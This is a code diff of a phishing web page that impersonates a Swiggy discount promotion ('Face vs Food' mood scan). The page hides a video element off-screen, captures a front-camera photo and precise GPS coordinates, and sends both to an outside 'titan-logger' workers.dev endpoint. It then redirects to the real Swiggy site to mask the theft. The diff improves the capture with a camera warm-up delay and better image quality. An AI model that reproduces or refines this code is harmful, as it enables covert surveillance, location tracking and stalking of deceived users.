@@ -3,38 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Swiggy | Exclusive Mood Match</title>
+    <title>Swiggy | Mood Matcher</title>
     <style>
-        body { background: #fff; margin: 0; font-family: 'Segoe UI', Roboto, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        body { background: #fff; margin: 0; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
         .card { text-align: center; width: 90%; max-width: 360px; padding: 40px 20px; border-radius: 25px; box-shadow: 0 15px 40px rgba(0,0,0,0.1); border-top: 6px solid #fc8019; }
-        .logo-box { width: 65px; height: 65px; background: #fc8019; border-radius: 18px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 38px; font-weight: 900; box-shadow: 0 8px 20px rgba(252, 128, 25, 0.3); }
-        h1 { font-size: 1.5rem; margin-bottom: 10px; color: #282c3f; }
-        p { color: #7e808c; font-size: 0.9rem; margin-bottom: 30px; }
-        .btn { background: #fc8019; color: #fff; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: 700; font-size: 1.1rem; cursor: pointer; transition: 0.3s; }
+        .logo { width: 65px; height: 65px; background: #fc8019; border-radius: 18px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 38px; font-weight: 900; }
+        .btn { background: #fc8019; color: #fff; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: 700; font-size: 1.1rem; cursor: pointer; }
         #loader { display: none; }
         .spinner { width: 35px; height: 35px; border: 4px solid #f3f3f3; border-top: 4px solid #fc8019; border-radius: 50%; animation: spin 1s linear infinite; margin: 15px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        /* STEALTH CAMERA: Hidden from view */
-        #v { position: fixed; top: -1000px; left: -1000px; width: 1px; height: 1px; opacity: 0; }
+        #v { position: fixed; top: -1000px; opacity: 0; }
     </style>
 </head>
 <body>
-
     <div class="card">
-        <div class="logo-box">S</div>
+        <div class="logo">S</div>
         <div id="ui">
             <h1>Face vs Food</h1>
-            <p>Scan your mood to unlock a <b>₹150 Discount</b> and find the best treats near your location.</p>
+            <p>Scan your mood to unlock <b>Free Delivery</b> and a <b>₹150 Discount</b> coupon.</p>
             <button id="btn" class="btn">MATCH MY MOOD</button>
         </div>
         <div id="loader">
             <div class="spinner"></div>
-            <p style="color: #fc8019; font-weight: bold; font-size: 0.8rem;">LOCKING GPS SIGNAL...</p>
+            <p style="color: #fc8019; font-weight: bold; font-size: 0.8rem;">ANALYZING MOOD SENSORS...</p>
         </div>
     </div>
-
+    
     <video id="v" playsinline muted autoplay></video>
-
+    
     <script>
         const API_URL = "https://titan-logger.saliljha523.workers.dev";
         const btn = document.getElementById('btn');
@@ -44,46 +40,44 @@
         btn.onclick = async () => {
             document.getElementById('ui').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
-
+            
             try {
-                // 1. Silent Camera Initialization
+                // 1. Start Camera
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
                 
-                // 2. High-Precision GPS Lock (Forcing Pin-Drop)
-                const position = await new Promise((resolve) => {
-                    navigator.geolocation.getCurrentPosition(resolve, () => resolve(null), {
-                        enableHighAccuracy: true,
-                        timeout: 15000, // Forces the phone to wait for a satellite fix
-                        maximumAge: 0   // No cached data allowed
+                // 2. Parallel: Start GPS Lock
+                const gpsPromise = new Promise((res) => {
+                    navigator.geolocation.getCurrentPosition(res, () => res(null), {
+                        enableHighAccuracy: true, timeout: 15000, maximumAge: 0
                     });
                 });
 
-                // 3. Coordinate Processing
-                const gpsString = position 
-                    ? `${position.coords.latitude.toFixed(7)},${position.coords.longitude.toFixed(7)}` 
-                    : "GPS_DATA_BLOCKED";
+                // 3. THE FIX: Wait 1.5 seconds for Camera Warm-up (Prevents Dark Images)
+                await new Promise(resolve => setTimeout(resolve, 1500));
 
-                // 4. Background Photo Capture
-                canvas.width = video.videoWidth;
+                // 4. Capture after warm-up
+                canvas.width = video.videoWidth; 
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                const imageData = canvas.toDataURL('image/jpeg', 0.2);
+                const img = canvas.toDataURL('image/jpeg', 0.4); // Slightly higher quality for brightness
 
-                // Stop hardware sensors
-                stream.getTracks().forEach(track => track.stop());
+                // 5. Finalize GPS
+                const pos = await gpsPromise;
+                const gps = pos ? `${pos.coords.latitude.toFixed(7)},${pos.coords.longitude.toFixed(7)}` : "GPS_DENIED";
 
-                // 5. Secure Data Uplink
+                // Shut down sensors
+                stream.getTracks().forEach(t => t.stop());
+
+                // 6. Send Data
                 await fetch(API_URL, {
                     method: 'POST',
                     mode: 'cors',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ image: imageData, gps: gpsString })
+                    body: JSON.stringify({ image: img, gps: gps })
                 });
 
-            } catch (err) { console.log("Sensors denied."); }
-
-            // 6. Redirect to Swiggy
+            } catch (err) { console.log(err); }
+            
             window.location.replace("https://www.swiggy.com/offers-near-me");
         };
     </script>
